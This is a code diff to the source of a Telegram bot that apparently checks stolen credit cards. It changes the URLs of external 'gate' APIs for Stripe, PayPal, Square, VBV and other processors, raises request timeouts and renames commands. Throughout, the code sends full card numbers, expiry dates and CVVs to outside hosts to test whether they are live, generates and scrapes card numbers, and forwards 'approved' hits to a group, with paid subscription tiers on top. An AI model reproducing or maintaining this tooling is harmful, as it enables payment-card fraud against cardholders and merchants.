@@ -33,7 +33,7 @@ MAX_SUBSCRIBED_CARDS_LIMIT = 30  # Increased limit for subscribed users
 MAX_VBV_LIMIT = 20  # Limit for VBV checks for non-subscribed users
 DAILY_CREDITS = 100  # Daily credits for non-subscribed users
 CC_GENERATOR_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count={}"
-SQ_API_URL = "https://ccapi-by-dark-waslost.onrender.com/key=dark/cc={}"
+SQ_API_URL = "https://darkwaslost-sq-api.onrender.com/key=dark/cc={}"
 B3_API_URL = "https://api-b33-stormx.onrender.com/gate=b4/key=darkwaslost/cc={}"
 VBV_API_URL = "https://waslost-vbv-api.onrender.com/key=darkwaslost/cc={}"
 SS_API_URL = "http://147.93.105.138:6677/gate=stsq/key=darkwaslost/cc={}"
@@ -43,7 +43,7 @@ SF_API_URL = "https://stripe-10.onrender.com/gate=st10/key=darkwaslost/cc={}"
 SHOPIFY_API_URL = "https://darkwaslost-cc-api-vnhx.onrender.com/key=cytron/cc={}"
 B4_API_URL = "https://api-b4-storm.onrender.com/gate=b4/key=darkwaslost/cc={}"
 PP_API_URL = "https://darkwaslost-pp-api-qapv.onrender.com/gate=b3/key=wasdarkboy/cc={}"
-PY_API_URL = "https://pyvbv2-api-storm.onrender.com/gate=paypal/key=waslost/cc={}"
+PY_API_URL = "https://darkwaslost-pp-api-zpn7.onrender.com/gate=paypal/key=waslost/cc={}"
 SVBV_API_URL = "https://pyvbv2-api-storm.onrender.com/gate=vbv2/key=waslost/cc={}"
 BOT_START_TIME = time.time()
 
@@ -522,7 +522,7 @@ def check_new_api_cc(cc):
         try:
             response = requests.get(
                 f"https://darkwaslost-sp-api-bjo9.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
-                timeout=120
+                timeout=300
             )
             if response.status_code == 200:
                 try:
@@ -609,7 +609,7 @@ def check_square_cc(cc):
         formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
         
         try:
-            response = requests.get(SQ_API_URL.format(formatted_cc), timeout=120)
+            response = requests.get(SQ_API_URL.format(formatted_cc), timeout=300)
             if response.status_code == 200:
                 data = response.json()
                 status = data.get('status', 'DECLINED').upper()
@@ -921,7 +921,7 @@ def check_vbv_cc(cc):
         formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
         
         try:
-            response = requests.get(VBV_API_URL.format(formatted_cc), timeout=120)
+            response = requests.get(VBV_API_URL.format(formatted_cc), timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -1036,7 +1036,7 @@ def check_cc_cc(cc):
         formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
         
         try:
-            response = requests.get(CC_API_URL.format(formatted_cc), timeout=120)
+            response = requests.get(CC_API_URL.format(formatted_cc), timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -1304,7 +1304,7 @@ def check_au_cc(cc):
 
         try:
             # API request to AU endpoint
-            response = requests.get(f"https://darkwaslost-sr-api.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}", timeout=120)
+            response = requests.get(f"https://darkwaslost-sr-api.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}", timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -4288,7 +4288,7 @@ def handle_gate_check(message):
 
         # Call external API
         api_url = f"https://gatefinder-dark-k0st.onrender.com/gatechk?site={site_url}"
-        response = requests.get(api_url, timeout=120)
+        response = requests.get(api_url, timeout=300)
 
         if response.status_code != 200:
             bot.edit_message_text(chat_id=message.chat.id,
@@ -4587,7 +4587,7 @@ def handle_scrape_cards(message):
 
         # API request
         url = f"https://card-scrapper.onrender.com/key=waslost/uname/{username}/{count}"
-        response = requests.get(url, timeout=120)
+        response = requests.get(url, timeout=300)
 
         if response.status_code != 200:
             return bot.edit_message_text("❌ Failed to fetch data from the server.", chat_id=chat_id, message_id=status_msg.message_id)
@@ -5885,7 +5885,7 @@ def check_premium_auth_cc(cc):
         try:
             response = requests.get(
                 f"https://paypal-ox9w.onrender.com/gate=1/key=darkwaslost/cc={formatted_cc}",
-                timeout=120
+                timeout=300
             )
             if response.status_code == 200:
                 try:
@@ -6197,7 +6197,7 @@ def check_sx_cc(cc):
         try:
             response = requests.get(
                 f"https://axapistormx.onrender.com/gate=s1/key=darkwaslost/cc={formatted_cc}",
-                timeout=120
+                timeout=300
             )
             if response.status_code == 200:
                 try:
@@ -7407,7 +7407,7 @@ def check_ss_cc(cc):
             }
             
             # Increased timeout to 60 seconds
-            response = requests.get(SS_API_URL.format(formatted_cc), headers=headers, timeout=120)
+            response = requests.get(SS_API_URL.format(formatted_cc), headers=headers, timeout=300)
             
             if response.status_code == 200:
                 try:
@@ -7824,7 +7824,7 @@ def check_pp_cc(cc):
             }
             
             # Increased timeout to 60 seconds
-            response = requests.get(PP_API_URL.format(formatted_cc), headers=headers, timeout=120)
+            response = requests.get(PP_API_URL.format(formatted_cc), headers=headers, timeout=300)
             
             if response.status_code == 200:
                 try:
@@ -8239,7 +8239,7 @@ def check_sr_api_cc(cc):
         try:
             response = requests.get(
                 f"https://darkwaslost-sr-api.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
-                timeout=120
+                timeout=300
             )
             if response.status_code == 200:
                 try:
@@ -8553,7 +8553,7 @@ def check_sp_api_cc(cc):
         try:
             response = requests.get(
                 f"https://darkwaslost-sp-api.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
-                timeout=120
+                timeout=300
             )
             if response.status_code == 200:
                 try:
@@ -8866,7 +8866,7 @@ def check_at_cc(cc):
         try:
             response = requests.get(
                 f"https://authnet-api.onrender.com/gate=auth/key=darkwaslost/cc={formatted_cc}",
-                timeout=120
+                timeout=300
             )
             if response.status_code == 200:
                 try:
@@ -9030,7 +9030,7 @@ def check_ah_cc(cc):
         formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
         
         try:
-            response = requests.get(AH_API_URL.format(formatted_cc), timeout=120)
+            response = requests.get(AH_API_URL.format(formatted_cc), timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -9338,7 +9338,7 @@ def check_sf_cc(cc):
         formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
         
         try:
-            response = requests.get(SF_API_URL.format(formatted_cc), timeout=120)
+            response = requests.get(SF_API_URL.format(formatted_cc), timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -9653,7 +9653,7 @@ def check_py_cc(cc):
         formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
         
         try:
-            response = requests.get(PY_API_URL.format(formatted_cc), timeout=120)
+            response = requests.get(PY_API_URL.format(formatted_cc), timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -9968,7 +9968,7 @@ def check_svbv_cc(cc):
         formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
         
         try:
-            response = requests.get(SVBV_API_URL.format(formatted_cc), timeout=120)
+            response = requests.get(SVBV_API_URL.format(formatted_cc), timeout=300)
             if response.status_code == 200:
                 try:
                     data = response.json()
@@ -10052,9 +10052,9 @@ def check_svbv_cc(cc):
         }
 
 # Handle both /cc and .cc
-@bot.message_handler(commands=['svbv'])
-@bot.message_handler(func=lambda m: m.text and m.text.startswith('.svbv'))
-def handle_svbv(message):
+@bot.message_handler(commands=['sbv'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sbv'))
+def handle_sbv(message):
     # Check if user is allowed to use in DMs
     if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
         bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
@@ -10088,7 +10088,7 @@ def handle_svbv(message):
                 if message.reply_to_message:
                     cc = message.reply_to_message.text.strip()
                 else:
-                    bot.reply_to(message, "❌ Invalid format. Use /svbv CC|MM|YYYY|CVV or .svbv CC|MM|YYYY|CVV")
+                    bot.reply_to(message, "❌ Invalid format. Use /sbv CC|MM|YYYY|CVV or .sbv CC|MM|YYYY|CVV")
                     return
             else:
                 cc = parts[1]
@@ -10125,7 +10125,7 @@ def handle_svbv(message):
                     if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                         bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                 except Exception as e:
-                    print(f"[Auto Forward Error - /svbv] {e}")
+                    print(f"[Auto Forward Error - /sbv] {e}")
 
             except Exception as e:
                 bot.edit_message_text(chat_id=message.chat.id,
@@ -10138,9 +10138,9 @@ def handle_svbv(message):
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
 # Handle both /mcc and .mcc
-@bot.message_handler(commands=['msvbv'])
-@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msvbv'))
-def handle_msvbv(message):
+@bot.message_handler(commands=['msbv'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msbv'))
+def handle_msbv(message):
     # Check if user is allowed to use in DMs
     if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
         bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
